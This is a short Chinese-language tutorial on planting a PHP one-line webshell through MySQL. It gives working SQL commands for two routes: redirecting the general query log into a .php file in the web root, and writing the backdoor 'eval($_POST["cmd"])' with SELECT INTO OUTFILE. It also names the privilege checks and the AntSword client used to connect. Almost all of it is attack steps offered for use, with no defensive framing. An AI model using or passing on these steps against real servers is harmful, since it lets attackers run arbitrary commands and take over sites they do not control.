通过日志文件写入一句话 webshell

mysql 5.0 版本以上会创建日志文件，日志文件会记录你执行过的 sql 记录。利用该记录可以写入一句话后门来获取 webshell。
利用条件：mysql5.0 以上版本；root 权限。
先通过 phpinfo.php 得到网站的绝对路径：

#general_log :指的是日志保存功能的状态，ON代表开启，OFF代表关闭。
#general_log_file ：日志的保存路径。

#查看general_log和general_log_file变量的值： 
show variables like '%general%';


这里general_log的值是OFF,使用命令开启日志记录功能 :
set global general_log='on';
#设置日志文件的存储路径:
set global general_log_file="C:/phpStudy/PHPTutorial/WWW/shell.php";


#执行一句话木马的sql语句：
SELECT '<?php eval($_POST["cmd"]);?>'


可以看到一句话木马写入成功：
​
使用蚁剑连接：


select … . into outfile 语句直接写入 webshell

需要查看当前是否有写入文件的权限，一般通过 my.ini 中的 secure_file_priv 的值来设置权限的，如果后面的参数没有设置值，则代表所有盘符都可以进行写入文件。

#查看是否具有写入权限：
SHOW GLOBAL VARIABLES LIKE 'secure%'


如果查询到值为 null，也是没有权限写入的。这里的值为空，代表可以写入：

执行sql语句写入webshell ：
select '<?php eval($_POST["cmd"]);?>' INTO OUTFILE 'C:/phpStudy/PHPTutorial/WWW/cmd.php';
